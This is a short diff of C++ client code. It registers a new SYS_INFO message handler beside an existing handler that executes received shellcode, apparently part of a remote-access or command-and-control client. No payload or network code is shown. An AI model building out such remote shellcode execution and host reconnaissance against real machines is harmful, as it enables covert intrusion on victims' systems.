@@ -150,6 +150,12 @@ void ClientSubsystem::setupEvents()
 		std::cout << "dispatch_->registerHandler(MessageType::EXECUTE_SHELL_CODE)" << std::endl;
 		controller_->handleExecuteShellcode(msg);
 	});
+
+	dispatcher_->registerHandler(MessageType::SYS_INFO, [&](const InternalMessage& msg)
+	{
+		std::cout << "dispatch_->registerHandler(MessageType::SYS_INFO)" << std::endl;
+		controller_->handleSystemInfo(msg);
+	});
 }
 
 void ClientSubsystem::setupTasks()
